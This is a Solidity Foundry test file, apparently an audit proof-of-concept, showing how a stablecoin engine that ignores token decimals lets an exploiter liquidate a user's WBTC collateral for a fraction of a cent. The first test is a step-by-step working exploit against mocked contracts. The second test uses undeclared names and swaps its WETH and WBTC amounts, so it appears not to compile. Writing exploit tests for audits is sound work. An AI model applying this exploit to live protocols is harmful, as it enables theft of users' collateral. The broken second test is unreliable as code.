// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import {DeployDSC} from "../../script/DeployDSC.s.sol";
import {DSCEngine} from "../../src/DSCEngine.sol";
import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/ERC20DecimalsMock.sol";
import {MockV3Aggregator} from "../mocks/MockV3Aggregator.sol";
import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";

contract TokenDecimalExploit is StdCheats, Test {
    DSCEngine public dsce;
    DecentralizedStableCoin public dsc;
    HelperConfig public helperConfig;

    address public ethUsdPriceFeed;
    address public btcUsdPriceFeed;
    address public weth;
    address public wbtc;
    uint256 public wethDecimals;
    uint256 public wbtcDecimals;
    uint256 public feedDecimals;
    uint256 public deployerKey;

    address public user = address(1);
    address public exploiter = address(2);

    uint256 public constant STARTING_USER_BALANCE = 10 ether;
    uint256 public constant MIN_HEALTH_FACTOR = 1e18;
    uint256 public constant LIQUIDATION_BONUS = 10;
    uint256 public constant LIQUIDATION_THRESHOLD = 50;
    uint256 public constant LIQUIDATION_PRECISION = 100;

    function setUp() external {
        DeployDSC deployer = new DeployDSC();
        (dsc, dsce, helperConfig) = deployer.run();
        (ethUsdPriceFeed, btcUsdPriceFeed, weth, wbtc, deployerKey) = helperConfig.activeNetworkConfig();
        if (block.chainid == 31337) {
            vm.deal(user, STARTING_USER_BALANCE);
        }
        ERC20DecimalsMock(weth).mint(user, STARTING_USER_BALANCE);
        ERC20DecimalsMock(wbtc).mint(user, STARTING_USER_BALANCE);
        ERC20DecimalsMock(weth).mint(exploiter, STARTING_USER_BALANCE);
        // The exploiter is not given any WBTC.

        wethDecimals = ERC20DecimalsMock(weth).decimals();
        wbtcDecimals = ERC20DecimalsMock(wbtc).decimals();
        feedDecimals = helperConfig.FEED_DECIMALS();
    }

    /**
     * @notice This test is based on a very real possible scenario involving WETH and WBTC.
     *
     * On Ethereum mainnet, WETH and WBTC have 18 and 8 decimals, respectively.
     * The current prices of WETH and WBTC are close to $2,000 and $30,000, respectively.
     * The `DSCEngine` allows a user to borrow up to the liquidation threshold.
     * The `DSCEngine` fails to account for token decimals when computing USD prices.
     */
    function testExploitTokenDecimals() public {
        // Set initial prices.
        MockV3Aggregator(ethUsdPriceFeed).updateAnswer(int256(2_000 * 10 ** feedDecimals)); // $2,000
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(int256(30_000 * 10 ** feedDecimals)); // $30,000

        // A user borrows the maximum possible amount of DSC using WETH as collateral.
        vm.startPrank(user);
        uint256 amountWethDeposited = 1 * 10 ** wethDecimals; // 1 WETH
        uint256 expectedValueWeth = 2_000 ether; // $2,000
        uint256 amountDscFromWeth = (expectedValueWeth * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(weth).approve(address(dsce), amountWethDeposited);
        dsce.depositCollateralAndMintDsc(weth, amountWethDeposited, amountDscFromWeth);
        assertEq(dsc.balanceOf(user), amountDscFromWeth);
        vm.stopPrank();

        // The user's 1 WETH should be worth $2,000 as we expect.
        uint256 valueWeth = dsce.getUsdValue(weth, amountWethDeposited);
        assertEq(valueWeth, expectedValueWeth);

        // Similarly, the reciprocal is true.
        uint256 amountWeth = dsce.getTokenAmountFromUsd(weth, expectedValueWeth);
        assertEq(amountWeth, amountWethDeposited);

        // Now the user borrows more DSC using WBTC collateral.
        // The flawed price computation ensures that the user can't borrow much at all, but they will anyway.
        vm.startPrank(user);
        uint256 amountWbtcDeposited = 1 * 10 ** wbtcDecimals; // 1 WBTC
        // This is the flaw! Given WBTC's 8 decimals, this WBTC is priced at $0.000003 instead of $30,000.
        uint256 expectedValueWbtc = 30_000 * 10 ** wbtcDecimals; // $0.000003 != $30,000
        uint256 amountDscFromWbtc = (expectedValueWbtc * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(wbtc).approve(address(dsce), amountWbtcDeposited);
        dsce.depositCollateralAndMintDsc(wbtc, amountWbtcDeposited, amountDscFromWbtc);
        assertEq(dsc.balanceOf(user), amountDscFromWeth + amountDscFromWbtc);
        vm.stopPrank();

        // The user's 1 WBTC is worth far too little.
        uint256 valueWbtc = dsce.getUsdValue(wbtc, amountWbtcDeposited);
        assertEq(valueWbtc, expectedValueWbtc);

        // Similarly, the reciprocal is true.
        uint256 amountWbtc = dsce.getTokenAmountFromUsd(wbtc, expectedValueWbtc);
        assertEq(amountWbtc, amountWbtcDeposited);

        // An exploiter acquires DSC to perform a liquidation (DSC could have come from the market, but we borrow it).
        vm.startPrank(exploiter);
        ERC20DecimalsMock(weth).approve(address(dsce), amountWethDeposited);
        dsce.depositCollateralAndMintDsc(weth, amountWethDeposited, amountDscFromWeth);
        assertEq(dsc.balanceOf(exploiter), amountDscFromWeth);
        vm.stopPrank();

        // Over time, the price of WBTC falls just slightly. The user is now vulnerable to liquidation.
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(int256(29_999 * 10 ** feedDecimals)); // $29,999
        uint256 newValueWbtc = dsce.getUsdValue(wbtc, amountWbtcDeposited);
        assertTrue(dsce.getHealthFactor(user) < MIN_HEALTH_FACTOR);

        // The exploiter liquidates the user's WBTC by paying back an "equivalent" amount of DSC.
        // The amount is actually far too low given the flawed price calculation.
        // After this, the exploiter still has plenty of DSC and all of the user's WBTC.
        // The exploiter paid ~$0.0000027 for ~$30,000 worth of WBTC.
        vm.startPrank(exploiter);
        // This comes out to about $0.0000027 (reduced from $0.000003 to account for 10% liquidation bonus)
        uint256 debtToPay = (newValueWbtc * LIQUIDATION_PRECISION) / (LIQUIDATION_PRECISION + LIQUIDATION_BONUS);
        dsc.approve(address(dsce), debtToPay);
        dsce.liquidate(wbtc, user, debtToPay);
        vm.stopPrank();

        // Exploiter has all of the WBTC and still lots of DSC left!
        uint256 err = 0.0001 ether; // 0.01% allowable relative error to account for rounding
        assertApproxEqRel(ERC20DecimalsMock(wbtc).balanceOf(exploiter), amountWbtcDeposited, err);
        assertApproxEqRel(dsc.balanceOf(exploiter), amountDscFromWeth, err);

        // User has no WBTC left in the `DSCEngine`.
        assertApproxEqAbs(dsce.getCollateralBalanceOfUser(user, wbtc), 0, 1); // 1 wei of allowable error for rounding
    }

    function testCriticalHealthFactor() public {
        // Arranging the liquidator
        uint256 liquidatorCollateral = 10e18;
        ERC20Mock(weth).mint(liquidator, liquidatorCollateral);
        vm.startPrank(liquidator);
        ERC20Mock(weth).approve(address(dsce), liquidatorCollateral);
        uint256 liquidatorDebtToCover = 200e18;
        dsce.depositCollateralAndMintDsc(weth, liquidatorCollateral, amountToMint);
        dsc.approve(address(dsce), liquidatorDebtToCover);
        vm.stopPrank();

        // We set the price of WETH to $105 and WBTC to $95
        int256 wethUsdPrice = 105e8;
        MockV3Aggregator(ethUsdPriceFeed).updateAnswer(wethUsdPrice);
        int256 wbtcUsdPrice = 95e8;
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(wbtcUsdPrice);

        // Alice deposits 1 WBTC and 1 WETH and mints 100 DSC
        uint256 amountWethToDeposit = 1e18;
        uint256 amountWbtcToDeposit = 1e18;
        uint256 amountDscToMint = 100e18;
        vm.startPrank(user);
        ERC20Mock(weth).approve(address(dsce), amountWbtcToDeposit);
        dsce.depositCollateral(weth, amountWbtcToDeposit);
        ERC20Mock(wbtc).approve(address(dsce), amountWethToDeposit);
        dsce.depositCollateralAndMintDsc(wbtc, amountWethToDeposit, amountDscToMint);

        // WBTC crashes in its price will be $0
        int256 wbtcUsdPriceAfterCrash = 0;
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(wbtcUsdPriceAfterCrash);

        // Now, a liquidator tries to liquidate $100 of Alice's debt, and it will be reverted.
        vm.expectRevert();
        vm.startPrank(liquidator);
        dsce.liquidate(weth, user, amountDscToMint);
        vm.stopPrank();

        // The liquidator tries to liquidate $94.5 of Alice's debt, and it will be reverted.
        uint256 maxValueToLiquidate = 94.5e18;
        vm.expectRevert();
        vm.startPrank(liquidator);
        dsce.liquidate(weth, user, maxValueToLiquidate);
        vm.stopPrank();
    }
}
